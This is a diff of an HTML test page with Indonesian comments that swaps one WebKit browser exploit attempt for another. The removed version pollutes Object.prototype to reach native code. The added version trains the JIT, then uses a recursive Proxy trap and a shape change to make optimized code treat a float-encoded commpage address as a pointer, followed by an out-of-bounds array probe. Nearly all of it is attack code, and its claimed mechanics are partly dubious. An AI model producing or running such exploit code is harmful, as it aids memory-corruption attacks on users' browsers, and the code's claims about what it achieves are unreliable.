@@ -1,118 +1,134 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Prototype Pollution to Native Crash</title>
+    <title>JIT Desync: Proxy Recursion</title>
 </head>
 <body>
 
-    <h1>Prototype Pollution Gadget</h1>
-    <p>Target: 0x0000000FFFFFC320</p>
-    <div id="status">INIT: Menyuntikkan Racun Prototype...</div>
-    <div id="log-area" style="border:1px solid #ccc; height:300px; overflow:scroll; font-family:monospace;"></div>
+    <h1>JIT Desynchronization (Watchpoint Bypass)</h1>
+    <p>Target Address: 0x0000000FFFFFC320</p>
+    <div id="status">INIT: Mempersiapkan JIT Trap...</div>
+    <div id="log-area" style="border:1px solid #333; background:#000; color:#0f0; padding:10px; font-family:monospace; height:400px; overflow:scroll;"></div>
 
     <script>
-        // --- TARGET CONSTANTS ---
-        const COMM_PAGE_TARGET = BigInt("0x0000000FFFFFC320");
-        const TARGET_VAL = Number(COMM_PAGE_TARGET & 0xFFFFFFFFn); // 32-bit slice
-
-        const logger = document.getElementById('log-area');
+        const LOG = document.getElementById('log-area');
         function log(msg) {
-            logger.innerHTML += `<div>[${performance.now().toFixed(0)}] ${msg}</div>`;
+            LOG.innerHTML += `<div>> ${msg}</div>`;
+            LOG.scrollTop = LOG.scrollHeight;
         }
 
-        // --- 1. FUNGSI POLLUTION ---
-        // Fungsi recursive merge yang sengaja dibuat rentan untuk mencemari __proto__
-        function pollute(target, source) {
-            for (let key in source) {
-                if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
-                    // Ini adalah celahnya. Kita membiarkan polusi terjadi pada Object.prototype
-                    Object.prototype[source[key].name] = source[key].value;
+        // --- 1. SETUP TARGET POINTER ---
+        // Kita gunakan ArrayBuffer View.
+        // Jika JIT salah hitung offset, dia akan membaca pointer ini sebagai alamat memori.
+        const TARGET_ADDR_LOW = 0xFFFFC320; // Bagian bawah alamat Commpage
+        const TARGET_ADDR_HIGH = 0x0000000F; // Bagian atas
+
+        // --- 2. THE BUTTERFLY CONFUSION SETUP ---
+        // WebKit menyimpan properti objek di tempat bernama "Butterfly".
+        // Kita ingin menukar Butterfly Double (angka) dengan Butterfly Pointer (objek).
+        
+        let confusionBuffer = new ArrayBuffer(8);
+        let floatView = new Float64Array(confusionBuffer);
+        let uintView = new Uint32Array(confusionBuffer);
+
+        // Masukkan alamat target ke dalam format float
+        uintView[0] = TARGET_ADDR_LOW;
+        uintView[1] = TARGET_ADDR_HIGH;
+        const POISON_FLOAT = floatView[0]; // Ini adalah alamat memori yang menyamar jadi angka
+
+        // --- 3. THE RECURSIVE TRAP ---
+        let depth = 0;
+        const MAX_DEPTH = 10000; // Cukup dalam untuk mendekati Stack Overflow
+        let victim = { x: 1.1, y: 2.2 }; // Objek awal (Double shape)
+
+        const handler = {
+            get: function(target, prop, receiver) {
+                if (prop === 'y') {
+                    depth++;
+                    // RECURSION BOMB
+                    // Kita memakan stack space sampai habis
+                    if (depth < MAX_DEPTH) {
+                        // Terus panggil properti ini secara rekursif
+                        return receiver[prop]; 
+                    } 
+                    
+                    // --- TITIK KRITIS (CRITICAL POINT) ---
+                    // Saat stack hampir meledak, kita ubah bentuk objek 'victim'.
+                    // Dari menyimpan Angka (Double) menjadi menyimpan Objek (Contiguous).
+                    // JIT yang sedang berjalan di luar sana masih mengira ini Angka.
+                    
+                    log("⚡ TRAP ACTIVE: Mengubah struktur memori di kedalaman " + depth);
+                    
+                    // Transisi bentuk objek (Shape Transition)
+                    victim.x = { a: 1 }; // Ubah x jadi objek
+                    victim.y = POISON_FLOAT; // Masukkan racun kita di y
+                    
+                    // Paksa Garbage Collection untuk membersihkan jejak lama
+                    try { new ArrayBuffer(10*1024*1024); } catch(e){}
+                    
+                    return POISON_FLOAT;
                 }
+                return Reflect.get(target, prop, receiver);
             }
+        };
+
+        const proxy = new Proxy(victim, handler);
+
+        // --- 4. FUNGSI OPTIMASI JIT ---
+        // Ini adalah fungsi yang akan dikompilasi oleh JIT (DFG/FTL)
+        // JIT akan melihat 'o.y' selalu mengembalikan angka, jadi dia menghilangkan type check.
+        function optimizeMe(o) {
+            // Operasi matematika memaksa JIT memperlakukan nilai sebagai angka
+            // Jika o.y ternyata adalah POINTER (karena desync), ini akan jadi pointer dereference.
+            return o.y + 1.0; 
         }
 
-        // --- 2. PAYLOAD RACUN ---
-        // Kita akan mencemari properti yang sering digunakan C++ secara internal.
-        // Properti seperti 'then', 'length', 'size', 'buffer', 'handle' sering diintip oleh C++.
-        
-        const poisonPayload = {
-            "__proto__": {
-                name: "then", // Menargetkan Promise logic di C++
-                value: TARGET_VAL 
-            }
-        };
-        
-        const poisonPayload2 = {
-             "__proto__": {
-                name: "roundingIncrement", // Menargetkan Intl.NumberFormat di C++
-                value: { 
-                    valueOf: () => { 
-                        log("⚠️ C++ mengakses roundingIncrement!"); 
-                        return TARGET_VAL; 
-                    }
-                }
-            }
-        };
-
-        // --- 3. EKSEKUSI ---
-        function runSilentAttack() {
-            log("💉 Phase 1: Menyuntikkan Polusi ke Object.prototype...");
+        // --- 5. EKSEKUSI ---
+        async function runExploit() {
+            log("Phase 1: Training JIT Compiler...");
             
-            // Lakukan polusi
-            try {
-                // Polusi 1: 'then' property (Sangat berbahaya untuk Promise native)
-                Object.prototype.then = TARGET_VAL; 
-                log("Polusi 'then' berhasil disuntikkan.");
-
-                // Polusi 2: Gadget spesifik Intl (Internationalization)
-                // Intl sering memiliki parser C++ yang kompleks
-                Object.defineProperty(Object.prototype, 'roundingIncrement', {
-                    get: function() {
-                        log("🔥 TRIGGER: WebKit C++ membaca properti terpolusi!");
-                        return 0x0000000FFFFFC320n; // Mengembalikan BigInt Commpage
-                        // Kita berharap C++ mencoba mengonversi ini menjadi pointer/integer dan crash
-                    }
-                });
-                
-            } catch(e) {
-                log("Error saat polusi: " + e.message);
+            // Latih JIT agar percaya bahwa 'victim' selalu berisi angka (Double)
+            for (let i = 0; i < 10000; i++) {
+                optimizeMe({ x: 1.1, y: 2.2 });
             }
+            
+            log("Phase 2: JIT Terlatih. Mengaktifkan Proxy Bomb...");
+            
+            // Berikan jeda agar JIT selesai optimasi background
+            await new Promise(r => setTimeout(r, 100));
 
-            log("⏳ Phase 2: Memicu Native Code Paths...");
-
-            // Trigger A: Promise Internal Confusion
-            // C++ Microtask queue mungkin bingung karena semua objek sekarang punya 'then'
-            Promise.resolve('test').catch(e => {});
-
-            // Trigger B: Intl.NumberFormat (Target Utama)
-            // Fitur ini membaca banyak opsi dari prototype jika tidak disediakan.
             try {
-                // Kita membuat formatter tanpa opsi, memaksanya melihat ke prototype
-                const formatter = new Intl.NumberFormat('en-US', { style: 'percent' });
+                // PANGGILAN MAUT
+                // Kita kirim Proxy ke fungsi yang sudah dioptimasi.
+                // Proxy akan memicu trap -> recursion -> shape change -> desync -> crash
+                let result = optimizeMe(proxy);
                 
-                // Paksa pemformatan angka aneh untuk memicu logic path C++
-                formatter.format(123.456);
+                log("Result: " + result);
+                if (result === POISON_FLOAT + 1.0) {
+                    log("⚠️ GAGAL: Nilai dibaca sebagai angka biasa.");
+                } else {
+                    log("❓ ANOMALI: Hasil tidak terduga, cek logs sistem.");
+                }
                 
-                log("Intl trigger selesai. Jika tidak crash, coba refresh.");
             } catch (e) {
-                log("Intl Error: " + e.message);
+                // Stack Overflow error diharapkan, tapi kita berharap crash memori terjadi SEBELUM error ini ditangkap.
+                log("Caught Expected Error: " + e.message);
+                if (e.message.includes("stack")) {
+                    log("🔥 STACK OVERFLOW TERJADI. Jika tidak crash, mitigasi Stack Check berhasil.");
+                }
             }
             
-            // Trigger C: RegExp Compilation
-            // RegExp engine juga membaca properti 'exec', 'flags', dll.
-            try {
-                Object.prototype.flags = {
-                    toString: () => { 
-                        log("⚠️ RegExp mengakses flags!"); 
-                        return "g"; // Normal return
-                    }
-                };
-                let r = /abc/;
-                r.exec("abc");
-            } catch(e) {}
+            // --- 6. SECONDARY TRIGGER (Array OOB via Desync) ---
+            log("Phase 3: Mencoba Array Length Confusion...");
+            // Jika desync terjadi tapi tidak crash, mungkin heap structure rusak.
+            // Coba akses array besar.
+            let arr = new Array(100);
+            arr.fill(1.1);
+            // Coba akses di luar batas jika length pointer rusak
+            log("Probe OOB: " + arr[1000]); 
         }
 
-        setTimeout(runSilentAttack, 1000);
+        setTimeout(runExploit, 1000);
 
     </script>
 </body>
